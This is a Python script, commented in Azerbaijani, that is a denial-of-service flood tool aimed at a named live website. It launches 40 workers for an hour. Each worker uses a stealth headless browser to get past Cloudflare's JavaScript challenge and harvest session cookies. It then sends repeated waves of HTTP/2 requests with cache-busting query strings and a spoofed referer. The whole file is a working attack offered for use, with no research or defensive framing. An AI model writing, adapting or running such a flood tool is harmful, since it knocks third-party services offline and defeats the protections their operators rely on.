import asyncio
from playwright.async_api import async_playwright
from playwright_stealth import stealth
import httpx
import time

# --- KONFİQURASİYA ---
TARGET_URL = "https://streamwin.win"
WORKERS = 40  # Railway-in gücünə görə artırıla bilər
DURATION = 3600 # 1 Saat

async def get_valid_session(p):
    """Cloudflare bypass edib kuki və UA qaytarır"""
    browser = await p.chromium.launch(headless=True, args=['--no-sandbox'])
    context = await browser.new_context(
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    )
    page = await context.new_page()
    await stealth(page) # Düzəliş edildi: stealth funksiyası burada çağırılır
    
    try:
        await page.goto(TARGET_URL, wait_until="networkidle", timeout=60000)
        await asyncio.sleep(10) # JS Challenge üçün gözləmə
        
        cookies = await context.cookies()
        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        
        await browser.close()
        return cookie_str, user_agent
    except Exception as e:
        print(f"[-] Bypass xətası: {e}")
        await browser.close()
        return None, None

async def attack_worker(worker_id):
    async with async_playwright() as p:
        start_time = time.time()
        
        while time.time() - start_time < DURATION:
            cookie, ua = await get_valid_session(p)
            
            if not cookie:
                await asyncio.sleep(5)
                continue
                
            print(f"[+] Worker {worker_id}: Bypass uğurlu! Hücum başlayır...")
            
            # HTTP/2 Flood hissəsi
            async with httpx.AsyncClient(http2=True, verify=False, timeout=10.0) as client:
                inner_start = time.time()
                while time.time() - inner_start < 600: # Hər 10 dəqiqədən bir kukini yenilə
                    try:
                        tasks = []
                        for _ in range(30): # Saniyəlik paket sıxlığı
                            headers = {
                                "User-Agent": ua,
                                "Cookie": cookie,
                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                "Referer": "https://www.google.com/"
                            }
                            # Cache-Busting
                            url = f"{TARGET_URL}/?nocache={random_str()}"
                            tasks.append(client.get(url, headers=headers))
                        
                        await asyncio.gather(*tasks, return_exceptions=True)
                        print(f"[*] Worker {worker_id} --> Sorğu dalğası göndərildi", end="\r")
                    except:
                        break # Bloklansa yeni kuki almağa get

def random_str():
    import random
    import string
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

async def main():
    print(f"🚀 RAILWAY HYBRID ATTACK STARTED ON {TARGET_URL}")
    tasks = [attack_worker(i) for i in range(WORKERS)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
